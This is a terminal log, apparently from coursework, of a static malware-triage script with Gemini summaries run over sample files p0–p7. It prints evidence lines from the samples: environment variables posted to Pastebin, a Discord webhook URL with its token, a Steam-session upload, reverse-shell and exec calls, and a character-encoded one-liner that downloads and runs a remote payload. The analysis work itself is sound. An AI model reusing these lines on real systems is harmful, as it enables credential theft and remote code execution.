@@ -1,0 +1,584 @@
+┌──(.venv)(calizo㉿kali-vm)-[~/gensec-calizo-calizo]
+└─$ python hw8/app.py ./../cs475-src/08_Summarization_ReverseEng/src/p6.py
+Target: /home/calizo/cs475-src/08_Summarization_ReverseEng/src/p6.py
+Files scanned: 1
+Total signals: 16
+Overall risk: HIGH (score=34)
+
+Per-file findings:
+
+- /home/calizo/cs475-src/08_Summarization_ReverseEng/src/p6.py
+  Risk: HIGH (score=34)
+  Imports: base64, ctypes, multiprocessing, os, platform, requests, socket, subprocess, threading, time
+  URLs:
+    - https://1.2.3.4:5678/
+  Signals:
+    - [MEDIUM] file_write via open-write (line 49)
+      Reason: Opens a file in write-capable mode (wb).
+      Evidence: with open(file_path, "wb") as f:
+    - [MEDIUM] network_access via socket.socket (line 54)
+      Reason: Creates a raw socket.
+      Evidence: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    - [HIGH] network_access via s.connect (line 55)
+      Reason: Attempts an outbound connection.
+      Evidence: s.connect((address, int(port)))
+    - [MEDIUM] process_spawn via threading.Thread (line 65)
+      Reason: Creates a thread.
+      Evidence: t = threading.Thread(target=func, args=args)
+    - [MEDIUM] process_spawn via multiprocessing.Process (line 71)
+      Reason: Creates a process.
+      Evidence: p = multiprocessing.Process(target=func, args=args)
+    - [MEDIUM] process_spawn via multiprocessing.Process (line 116)
+      Reason: Creates a process.
+      Evidence: multiprocessing.Process(target=reverse_shell, args=(
+    - [MEDIUM] file_write via open-write (line 149)
+      Reason: Opens a file in write-capable mode (wb).
+      Evidence: with open("/tmp/data.bak", "wb") as f:
+    - [MEDIUM] process_spawn via threading.Thread (line 156)
+      Reason: Creates a thread.
+      Evidence: threading.Thread(target=sp.getoutput, args=("/tmp/data.bak",)).start()
+    - [MEDIUM] process_spawn via multiprocessing.Process (line 160)
+      Reason: Creates a process.
+      Evidence: multiprocessing.Process(target=sp.getoutput, args=("/tmp/data.bak",)).start()
+    - [HIGH] dynamic_execution via exec (line 170)
+      Reason: Uses exec.
+      Evidence: exec(module_content)
+    - [MEDIUM] process_spawn via threading.Thread (line 175)
+      Reason: Creates a thread.
+      Evidence: threading.Thread(target=exec, args=(module_content,)).start()
+    - [MEDIUM] process_spawn via multiprocessing.Process (line 179)
+      Reason: Creates a process.
+      Evidence: multiprocessing.Process(target=exec, args=(module_content,)).start()
+    - [MEDIUM] file_write via open-write (line 183)
+      Reason: Opens a file in write-capable mode (wb).
+      Evidence: with open("/tmp/save_dat01", "wb") as f:
+    - [MEDIUM] process_spawn via threading.Thread (line 198)
+      Reason: Creates a thread.
+      Evidence: threading.Thread(target=sp.getoutput, args=(module_content.decode(),)).start()
+    - [MEDIUM] process_spawn via multiprocessing.Process (line 202)
+      Reason: Creates a process.
+      Evidence: multiprocessing.Process(target=sp.getoutput, args=(module_content.decode(),)).start()
+    - [MEDIUM] file_write via open-write (line 206)
+      Reason: Opens a file in write-capable mode (wb).
+      Evidence: with open("/tmp/save_dat01", "wb") as f:
+
+Limitations: static-only analysis; this version does not execute or emulate code.
+
+┌──(.venv)(calizo㉿kali-vm)-[~/gensec-calizo-calizo]
+└─$ python hw8/app.py ./../cs475-src/08_Summarization_ReverseEng/src/p6.py --use-llm
+Target: /home/calizo/cs475-src/08_Summarization_ReverseEng/src/p6.py
+Files scanned: 1
+Total signals: 16
+Overall risk: HIGH (score=34)
+
+Per-file findings:
+
+- /home/calizo/cs475-src/08_Summarization_ReverseEng/src/p6.py
+  Risk: HIGH (score=34)
+  Imports: base64, ctypes, multiprocessing, os, platform, requests, socket, subprocess, threading, time
+  URLs:
+    - https://1.2.3.4:5678/
+  Signals:
+    - [MEDIUM] file_write via open-write (line 49)
+      Reason: Opens a file in write-capable mode (wb).
+      Evidence: with open(file_path, "wb") as f:
+    - [MEDIUM] network_access via socket.socket (line 54)
+      Reason: Creates a raw socket.
+      Evidence: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    - [HIGH] network_access via s.connect (line 55)
+      Reason: Attempts an outbound connection.
+      Evidence: s.connect((address, int(port)))
+    - [MEDIUM] process_spawn via threading.Thread (line 65)
+      Reason: Creates a thread.
+      Evidence: t = threading.Thread(target=func, args=args)
+    - [MEDIUM] process_spawn via multiprocessing.Process (line 71)
+      Reason: Creates a process.
+      Evidence: p = multiprocessing.Process(target=func, args=args)
+    - [MEDIUM] process_spawn via multiprocessing.Process (line 116)
+      Reason: Creates a process.
+      Evidence: multiprocessing.Process(target=reverse_shell, args=(
+    - [MEDIUM] file_write via open-write (line 149)
+      Reason: Opens a file in write-capable mode (wb).
+      Evidence: with open("/tmp/data.bak", "wb") as f:
+    - [MEDIUM] process_spawn via threading.Thread (line 156)
+      Reason: Creates a thread.
+      Evidence: threading.Thread(target=sp.getoutput, args=("/tmp/data.bak",)).start()
+    - [MEDIUM] process_spawn via multiprocessing.Process (line 160)
+      Reason: Creates a process.
+      Evidence: multiprocessing.Process(target=sp.getoutput, args=("/tmp/data.bak",)).start()
+    - [HIGH] dynamic_execution via exec (line 170)
+      Reason: Uses exec.
+      Evidence: exec(module_content)
+    - [MEDIUM] process_spawn via threading.Thread (line 175)
+      Reason: Creates a thread.
+      Evidence: threading.Thread(target=exec, args=(module_content,)).start()
+    - [MEDIUM] process_spawn via multiprocessing.Process (line 179)
+      Reason: Creates a process.
+      Evidence: multiprocessing.Process(target=exec, args=(module_content,)).start()
+    - [MEDIUM] file_write via open-write (line 183)
+      Reason: Opens a file in write-capable mode (wb).
+      Evidence: with open("/tmp/save_dat01", "wb") as f:
+    - [MEDIUM] process_spawn via threading.Thread (line 198)
+      Reason: Creates a thread.
+      Evidence: threading.Thread(target=sp.getoutput, args=(module_content.decode(),)).start()
+    - [MEDIUM] process_spawn via multiprocessing.Process (line 202)
+      Reason: Creates a process.
+      Evidence: multiprocessing.Process(target=sp.getoutput, args=(module_content.decode(),)).start()
+    - [MEDIUM] file_write via open-write (line 206)
+      Reason: Opens a file in write-capable mode (wb).
+      Evidence: with open("/tmp/save_dat01", "wb") as f:
+
+Limitations: static-only analysis; this version does not execute or emulate code.
+
+Gemini verdict:
+  Model: gemini-2.5-flash
+  Risk level: unknown
+  Summary: {
+  "summary": "The analyzed Python script exhibits numerous high-risk behaviors, including establishing outbound network connections to a hardcoded IP, creating multiple processes and threads, writing files to temporary directories, and performing dynamic code execution. The presence of a 'reverse_shell' function call within a spawned process strongly suggests malicious intent, likely for remote command and control or data exfiltration.",
+  "risk_level": "high",
+  "likely_behaviors": [
+    "Establishing outbound network connections (C2)",
+    "Dynamic code execution (obfuscation, payload execution)",
+    "Process and thread injection/spawning",
+    "Writing arbitrary files to disk",
+    "Implementing a reverse shell"
+  ],
+  "top_evidence": [
+    "Attempts an outbound connection to https://1.2.3.4:5678/ via `s.connect((address, int(port)))` (high severity)",
+    "Uses `exec(module_content)` for dynamic code execution (high severity)",
+    "Spawns a process targeting `reverse_shell` function: `multiprocessing.Process(target=reverse_shell, args=("`",
+    "Opens files in write-capable mode, including to `/tmp/data.bak` and `/tmp/save_dat01`",
+    "Creates multiple threads and processes using `threading.Thread` and `multiprocessing.Process`"
+  ],
+  "limitations": [
+    "Static analysis lacks runtime context and actual network traffic details.",
+    "The full content of `module_content` and `file_path` is not visible, which could reveal further malicious actions.",
+    "The purpose of file writes to temporary locations or what `reverse_shell` exactly does is inferred, not observed."
+  ]
+}
+  LLM limitations:
+    - The model did not return valid JSON.
+
+┌──(.venv)(calizo㉿kali-vm)-[~/gensec-calizo-calizo]
+└─$ python hw8/app.py ./../cs475-src/08_Summarization_ReverseEng/src/p6.py --use-llm --json
+{
+  "target": "/home/calizo/cs475-src/08_Summarization_ReverseEng/src/p6.py",
+  "files_scanned": 1,
+  "total_signals": 16,
+  "overall_risk": "high",
+  "limitations": [
+    "Static-only analysis.",
+    "This tool does not execute or emulate code."
+  ],
+  "files": [
+    {
+      "path": "/home/calizo/cs475-src/08_Summarization_ReverseEng/src/p6.py",
+      "risk": "high",
+      "score": 34,
+      "imports": [
+        "base64",
+        "ctypes",
+        "multiprocessing",
+        "os",
+        "platform",
+        "requests",
+        "socket",
+        "subprocess",
+        "threading",
+        "time"
+      ],
+      "urls": [
+        "https://1.2.3.4:5678/"
+      ],
+      "decoded": [],
+      "signals": [
+        {
+          "category": "file_write",
+          "severity": "medium",
+          "rule": "open-write",
+          "reason": "Opens a file in write-capable mode (wb).",
+          "line": 49,
+          "evidence": "with open(file_path, \"wb\") as f:"
+        },
+        {
+          "category": "network_access",
+          "severity": "medium",
+          "rule": "socket.socket",
+          "reason": "Creates a raw socket.",
+          "line": 54,
+          "evidence": "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)"
+        },
+        {
+          "category": "network_access",
+          "severity": "high",
+          "rule": "s.connect",
+          "reason": "Attempts an outbound connection.",
+          "line": 55,
+          "evidence": "s.connect((address, int(port)))"
+        },
+        {
+          "category": "process_spawn",
+          "severity": "medium",
+          "rule": "threading.Thread",
+          "reason": "Creates a thread.",
+          "line": 65,
+          "evidence": "t = threading.Thread(target=func, args=args)"
+        },
+        {
+          "category": "process_spawn",
+          "severity": "medium",
+          "rule": "multiprocessing.Process",
+          "reason": "Creates a process.",
+          "line": 71,
+          "evidence": "p = multiprocessing.Process(target=func, args=args)"
+        },
+        {
+          "category": "process_spawn",
+          "severity": "medium",
+          "rule": "multiprocessing.Process",
+          "reason": "Creates a process.",
+          "line": 116,
+          "evidence": "multiprocessing.Process(target=reverse_shell, args=("
+        },
+        {
+          "category": "file_write",
+          "severity": "medium",
+          "rule": "open-write",
+          "reason": "Opens a file in write-capable mode (wb).",
+          "line": 149,
+          "evidence": "with open(\"/tmp/data.bak\", \"wb\") as f:"
+        },
+        {
+          "category": "process_spawn",
+          "severity": "medium",
+          "rule": "threading.Thread",
+          "reason": "Creates a thread.",
+          "line": 156,
+          "evidence": "threading.Thread(target=sp.getoutput, args=(\"/tmp/data.bak\",)).start()"
+        },
+        {
+          "category": "process_spawn",
+          "severity": "medium",
+          "rule": "multiprocessing.Process",
+          "reason": "Creates a process.",
+          "line": 160,
+          "evidence": "multiprocessing.Process(target=sp.getoutput, args=(\"/tmp/data.bak\",)).start()"
+        },
+        {
+          "category": "dynamic_execution",
+          "severity": "high",
+          "rule": "exec",
+          "reason": "Uses exec.",
+          "line": 170,
+          "evidence": "exec(module_content)"
+        },
+        {
+          "category": "process_spawn",
+          "severity": "medium",
+          "rule": "threading.Thread",
+          "reason": "Creates a thread.",
+          "line": 175,
+          "evidence": "threading.Thread(target=exec, args=(module_content,)).start()"
+        },
+        {
+          "category": "process_spawn",
+          "severity": "medium",
+          "rule": "multiprocessing.Process",
+          "reason": "Creates a process.",
+          "line": 179,
+          "evidence": "multiprocessing.Process(target=exec, args=(module_content,)).start()"
+        },
+        {
+          "category": "file_write",
+          "severity": "medium",
+          "rule": "open-write",
+          "reason": "Opens a file in write-capable mode (wb).",
+          "line": 183,
+          "evidence": "with open(\"/tmp/save_dat01\", \"wb\") as f:"
+        },
+        {
+          "category": "process_spawn",
+          "severity": "medium",
+          "rule": "threading.Thread",
+          "reason": "Creates a thread.",
+          "line": 198,
+          "evidence": "threading.Thread(target=sp.getoutput, args=(module_content.decode(),)).start()"
+        },
+        {
+          "category": "process_spawn",
+          "severity": "medium",
+          "rule": "multiprocessing.Process",
+          "reason": "Creates a process.",
+          "line": 202,
+          "evidence": "multiprocessing.Process(target=sp.getoutput, args=(module_content.decode(),)).start()"
+        },
+        {
+          "category": "file_write",
+          "severity": "medium",
+          "rule": "open-write",
+          "reason": "Opens a file in write-capable mode (wb).",
+          "line": 206,
+          "evidence": "with open(\"/tmp/save_dat01\", \"wb\") as f:"
+        }
+      ],
+      "syntax_error": null
+    }
+  ],
+  "llm": {
+    "model": "gemini-2.5-flash",
+    "verdict": {
+      "summary": "This Python script exhibits highly suspicious behavior, including attempting outbound network connections to a hardcoded IP, creating multiple threads and processes, dynamically executing code, and writing data to temporary files. It strongly resembles a reverse shell or a command-and-control client due to its network and execution capabilities.",
+      "risk_level": "high",
+      "likely_behaviors": [
+        "Establish outbound network communication (e.g., C2 or data exfiltration)",
+        "Execute arbitrary code dynamically (e.g., received commands)",
+        "Perform process/thread injection or manipulation",
+        "Write data to temporary files for persistence or staging"
+      ],
+      "top_evidence": [
+        "Attempts an outbound connection (s.connect) to 'https://1.2.3.4:5678/'",
+        "Uses exec for dynamic code execution (exec(module_content))",
+        "Creates a raw socket (socket.socket)",
+        "Spawns multiple processes and threads (multiprocessing.Process, threading.Thread)",
+        "Opens files in write-capable mode for temporary files"
+      ],
+      "limitations": [
+        "Static analysis cannot determine the actual content of 'module_content' or 'data.bak' without dynamic execution.",
+        "The exact commands or data exchanged over the network connection are unknown.",
+        "The purpose of writing to '/tmp/data.bak' and '/tmp/save_dat01' is not fully clear from static analysis alone.",
+        "Obfuscation techniques might be present that static analysis could not fully decode."
+      ]
+    }
+  }
+}
+
+┌──(.venv)(calizo㉿kali-vm)-[~/gensec-calizo-calizo]
+└─$ python hw8/app.py ./../cs475-src/08_Summarization_ReverseEng/src --use-llm --collect ./hw8_review
+/home/calizo/cs475-src/08_Summarization_ReverseEng/src/p5.py:21: SyntaxWarning: invalid escape sequence '\s'
+  with zipfile.ZipFile(f"{os.environ['TEMP']}\steam_session.zip",'w',zipfile.ZIP_DEFLATED) as zp:
+/home/calizo/cs475-src/08_Summarization_ReverseEng/src/p5.py:23: SyntaxWarning: invalid escape sequence '\s'
+  file = {"file": open(f"{os.environ['TEMP']}\steam_session.zip", "rb")}
+/home/calizo/cs475-src/08_Summarization_ReverseEng/src/p5.py:26: SyntaxWarning: invalid escape sequence '\s'
+  os.remove(f"{os.environ['TEMP']}\steam_session.zip")
+Target: /home/calizo/cs475-src/08_Summarization_ReverseEng/src
+Files scanned: 10
+Total signals: 45
+Overall risk: HIGH (score=97)
+
+Per-file findings:
+
+- /home/calizo/cs475-src/08_Summarization_ReverseEng/src/p0.py
+  Risk: MEDIUM (score=4)
+  Imports: multiprocessing, os, requests, time
+  URLs:
+    - https://pastebin.com/api/api_post.php
+  Signals:
+    - [MEDIUM] file_write via open-write (line 6)
+      Reason: Opens a file in write-capable mode (w).
+      Evidence: with open(".env", 'w') as f: f.write(env_vars)
+    - [MEDIUM] network_access via requests.post (line 7)
+      Reason: Makes an outbound HTTP POST request.
+      Evidence: requests.post("https://pastebin.com/api/api_post.php", data={'content': env_vars})
+
+- /home/calizo/cs475-src/08_Summarization_ReverseEng/src/p1.py
+  Risk: HIGH (score=15)
+  Imports: ctypes, logging, os, re, subprocess, sys, time, winreg
+  Signals:
+    - [HIGH] process_launch via subprocess.check_call (line 55)
+      Reason: Launches a child process.
+      Evidence: return subprocess.check_call('echo %s |clip' % text.strip() , shell=True)
+    - [MEDIUM] environment_access via os.getenv (line 70)
+      Reason: Reads an environment variable.
+      Evidence: path = os.getenv('APPDATA')
+    - [MEDIUM] environment_access via os.getenv (line 76)
+      Reason: Reads an environment variable.
+      Evidence: address = os.getenv('LOCALAPPDATA') + '\\Programs\\Python\\Launcher\\py.exe' + ' ' + '-i ' + '"' + path + '\\' + file_name + '"'
+    - [MEDIUM] environment_access via os.getenv (line 98)
+      Reason: Reads an environment variable.
+      Evidence: path =  os.getenv('APPDATA') + '\\'
+    - [MEDIUM] environment_access via os.getenv (line 99)
+      Reason: Reads an environment variable.
+      Evidence: hide_path = os.getenv('APPDATA') + '\\' + sys.argv[0] #BACK
+    - [MEDIUM] file_write via open-write (line 102)
+      Reason: Opens a file in write-capable mode (w).
+      Evidence: with open(hide_path, 'w', encoding='utf-8') as f:
+    - [MEDIUM] environment_access via os.getenv (line 136)
+      Reason: Reads an environment variable.
+      Evidence: hide_path = os.getenv('APPDATA') + '\\' + sys.argv[0]
+
+- /home/calizo/cs475-src/08_Summarization_ReverseEng/src/p2.py
+  Risk: HIGH (score=18)
+  Imports: cryptography, ctypes, datetime, os, platform, random, requests, shutil, ssl, subprocess, time, tkinter
+  Signals:
+    - [HIGH] process_launch via subprocess.call (line 71)
+      Reason: Launches a child process.
+      Evidence: subprocess.call('cls' if os.name == 'nt' else 'clear', shell=False)
+    - [HIGH] process_launch via os.system (line 72)
+      Reason: Executes a shell command.
+      Evidence: os.system('cls' if os.name == 'nt' else 'clear')
+    - [MEDIUM] file_write via open-write (line 74)
+      Reason: Opens a file in write-capable mode (w).
+      Evidence: f = open("logs/path.txt", "w")
+    - [MEDIUM] file_write via open-write (line 88)
+      Reason: Opens a file in write-capable mode (w).
+      Evidence: f = open("logs/cnt.txt", "w")
+    - [MEDIUM] network_access via requests.post (line 98)
+      Reason: Makes an outbound HTTP POST request.
+      Evidence: requests.post(url, data)
+    - [MEDIUM] file_write via open-write (line 124)
+      Reason: Opens a file in write-capable mode (w).
+      Evidence: f = open("logs/digits.txt", "w")
+    - [MEDIUM] file_write via open-write (line 194)
+      Reason: Opens a file in write-capable mode (wb).
+      Evidence: with open(filename, "wb") as file:
+    - [MEDIUM] file_write via open-write (line 238)
+      Reason: Opens a file in write-capable mode (w).
+      Evidence: f = open("logs/digits.txt", "w")
+
+- /home/calizo/cs475-src/08_Summarization_ReverseEng/src/p3.py
+  Risk: LOW (score=3)
+  Imports: json, locale, platform, psutil, socket, time
+  Signals:
+    - [HIGH] network_access via client.connect (line 78)
+      Reason: Attempts an outbound connection.
+      Evidence: client.connect((host, port))
+
+- /home/calizo/cs475-src/08_Summarization_ReverseEng/src/p4.py
+  Risk: MEDIUM (score=4)
+  Imports: os, pathlib, requests, time
+  URLs:
+    - https://discord.com/api/webhooks/1103377250541391932/rBJX_p_1lmkUoUcA_zmEbJ3qhHbXoocinOtwlAqPji0EgHYo2486vpU0OvjcTAz_T102
+  Signals:
+    - [MEDIUM] network_access via requests.post (line 38)
+      Reason: Makes an outbound HTTP POST request.
+      Evidence: response = requests.post(DISCORD_WEBHOOK_URL, json=data, headers=headers)
+    - [MEDIUM] network_access via requests.post (line 60)
+      Reason: Makes an outbound HTTP POST request.
+      Evidence: response = requests.post(DISCORD_WEBHOOK_URL, files={"file": file})
+
+- /home/calizo/cs475-src/08_Summarization_ReverseEng/src/p5.py
+  Risk: HIGH (score=16)
+  Imports: base64, os, requests, zipfile
+  URLs:
+    - https://mehmetaliii.pythonanywhere.com/webzuhurt
+  Signals:
+    - [MEDIUM] network_access via requests.get (line 4)
+      Reason: Makes an outbound HTTP GET request.
+      Evidence: hook = base64.b64decode(requests.get("https://mehmetaliii.pythonanywhere.com/webzuhurt").text).decode()
+    - [MEDIUM] obfuscation_or_decode via base64.b64decode (line 4)
+      Reason: Decodes Base64 content.
+      Evidence: hook = base64.b64decode(requests.get("https://mehmetaliii.pythonanywhere.com/webzuhurt").text).decode()
+    - [MEDIUM] environment_access via os.environ[] (line 7)
+      Reason: Reads an environment variable via os.environ[...].
+      Evidence: if os.path.exists(os.environ["PROGRAMFILES(X86)"]+"\\steam"):
+    - [MEDIUM] environment_access via os.environ[] (line 8)
+      Reason: Reads an environment variable via os.environ[...].
+      Evidence: steam_path = os.environ["PROGRAMFILES(X86)"]+"\\steam"
+    - [MEDIUM] environment_access via os.environ[] (line 21)
+      Reason: Reads an environment variable via os.environ[...].
+      Evidence: with zipfile.ZipFile(f"{os.environ['TEMP']}\steam_session.zip",'w',zipfile.ZIP_DEFLATED) as zp:
+    - [MEDIUM] environment_access via os.environ[] (line 23)
+      Reason: Reads an environment variable via os.environ[...].
+      Evidence: file = {"file": open(f"{os.environ['TEMP']}\steam_session.zip", "rb")}
+    - [MEDIUM] network_access via requests.post (line 24)
+      Reason: Makes an outbound HTTP POST request.
+      Evidence: r = requests.post(hook, files=file)
+    - [MEDIUM] environment_access via os.environ[] (line 26)
+      Reason: Reads an environment variable via os.environ[...].
+      Evidence: os.remove(f"{os.environ['TEMP']}\steam_session.zip")
+
+- /home/calizo/cs475-src/08_Summarization_ReverseEng/src/p6.py
+  Risk: HIGH (score=34)
+  Imports: base64, ctypes, multiprocessing, os, platform, requests, socket, subprocess, threading, time
+  URLs:
+    - https://1.2.3.4:5678/
+  Signals:
+    - [MEDIUM] file_write via open-write (line 49)
+      Reason: Opens a file in write-capable mode (wb).
+      Evidence: with open(file_path, "wb") as f:
+    - [MEDIUM] network_access via socket.socket (line 54)
+      Reason: Creates a raw socket.
+      Evidence: s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    - [HIGH] network_access via s.connect (line 55)
+      Reason: Attempts an outbound connection.
+      Evidence: s.connect((address, int(port)))
+    - [MEDIUM] process_spawn via threading.Thread (line 65)
+      Reason: Creates a thread.
+      Evidence: t = threading.Thread(target=func, args=args)
+    - [MEDIUM] process_spawn via multiprocessing.Process (line 71)
+      Reason: Creates a process.
+      Evidence: p = multiprocessing.Process(target=func, args=args)
+    - [MEDIUM] process_spawn via multiprocessing.Process (line 116)
+      Reason: Creates a process.
+      Evidence: multiprocessing.Process(target=reverse_shell, args=(
+    - [MEDIUM] file_write via open-write (line 149)
+      Reason: Opens a file in write-capable mode (wb).
+      Evidence: with open("/tmp/data.bak", "wb") as f:
+    - [MEDIUM] process_spawn via threading.Thread (line 156)
+      Reason: Creates a thread.
+      Evidence: threading.Thread(target=sp.getoutput, args=("/tmp/data.bak",)).start()
+    - [MEDIUM] process_spawn via multiprocessing.Process (line 160)
+      Reason: Creates a process.
+      Evidence: multiprocessing.Process(target=sp.getoutput, args=("/tmp/data.bak",)).start()
+    - [HIGH] dynamic_execution via exec (line 170)
+      Reason: Uses exec.
+      Evidence: exec(module_content)
+    - [MEDIUM] process_spawn via threading.Thread (line 175)
+      Reason: Creates a thread.
+      Evidence: threading.Thread(target=exec, args=(module_content,)).start()
+    - [MEDIUM] process_spawn via multiprocessing.Process (line 179)
+      Reason: Creates a process.
+      Evidence: multiprocessing.Process(target=exec, args=(module_content,)).start()
+    - [MEDIUM] file_write via open-write (line 183)
+      Reason: Opens a file in write-capable mode (wb).
+      Evidence: with open("/tmp/save_dat01", "wb") as f:
+    - [MEDIUM] process_spawn via threading.Thread (line 198)
+      Reason: Creates a thread.
+      Evidence: threading.Thread(target=sp.getoutput, args=(module_content.decode(),)).start()
+    - [MEDIUM] process_spawn via multiprocessing.Process (line 202)
+      Reason: Creates a process.
+      Evidence: multiprocessing.Process(target=sp.getoutput, args=(module_content.decode(),)).start()
+    - [MEDIUM] file_write via open-write (line 206)
+      Reason: Opens a file in write-capable mode (wb).
+      Evidence: with open("/tmp/save_dat01", "wb") as f:
+
+- /home/calizo/cs475-src/08_Summarization_ReverseEng/src/p7.py
+  Risk: LOW (score=3)
+  Signals:
+    - [HIGH] dynamic_execution via exec (line 1)
+      Reason: Uses exec.
+      Evidence: exec(''.join(chr(x) for x in [105,109,112,111,114,116,32,111,115,10,105,109,112,111,114,116,32,117,114,108,108,105,98,10,105,109,112,111,114,116,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,10,120,32,61,32,117,114,108,108,105,98,46,114,101,113,117,101,115,116,46,117,114,108,111,112,101,110,40,34,104,116,116,112,115,58,47,47,119,119,119,46,101,118,105,108,100,111,106,111,46,99,111,109,47,115,116,97,103,101,49,112,97,121,108,111,97,100,34,41,10,121,32,61,32,120,46,114,101,97,100,40,41,10,122,32,61,32,121,46,100,101,99,111,100,101,40,34,117,116,102,56,34,41,10,120,46,99,108,111,115,101,40,41,10,111,115,46,115,121,115,116,101,109,40,122,41,10]))
+
+Limitations: static-only analysis; this version does not execute or emulate code.
+
+Gemini verdict:
+  Model: gemini-2.5-flash
+  Risk level: high
+  Summary: The analysis of the provided Python scripts reveals multiple high-risk findings, indicating potential malicious activity. Several scripts exhibit capabilities for dynamic code execution, establishing outbound network connections (including potential reverse shells), launching child processes, writing to local files, and reading environment variables. This suggests possible data exfiltration, command-and-control communication, or further payload execution.
+  Likely behaviors:
+    - Dynamic code execution (`exec`)
+    - Initiating outbound network connections (HTTP requests and raw sockets)
+    - Launching child processes or executing shell commands
+    - Writing data to local files (e.g., configuration, logs, temporary archives)
+    - Reading system environment variables
+    - Decoding obfuscated content (Base64)
+    - Spawning new threads and processes
+  Top evidence:
+    - Uses `exec` for dynamic code execution (p6.py, p7.py)
+    - Attempts outbound socket connection to a specific address/port (p6.py)
+    - Launches child processes or executes shell commands (p1.py, p2.py)
+    - Makes outbound HTTP POST requests to external services like Pastebin or Discord webhooks (p0.py, p4.py, p5.py)
+    - Reads environment variables like APPDATA and PROGRAMFILES(X86) (p1.py, p5.py)
+  LLM limitations:
+    - Static analysis cannot fully confirm the runtime behavior or ultimate intent of the detected signals.
+    - Obfuscated or dynamically loaded code might hide further malicious functionality not resolvable statically.
+    - The specific content of data written to files or exfiltrated over the network is not analyzed.
+    - The analysis does not differentiate between legitimate use of these functionalities and malicious intent without execution context.
+
+Collection:
+  Directory: /home/calizo/gensec-calizo-calizo/hw8_review
+  Copied suspicious files: 8
+  Manifest: /home/calizo/gensec-calizo-calizo/hw8_review/triage_manifest.json
+
+┌──(.venv)(calizo㉿kali-vm)-[~/gensec-calizo-calizo]
+└─$
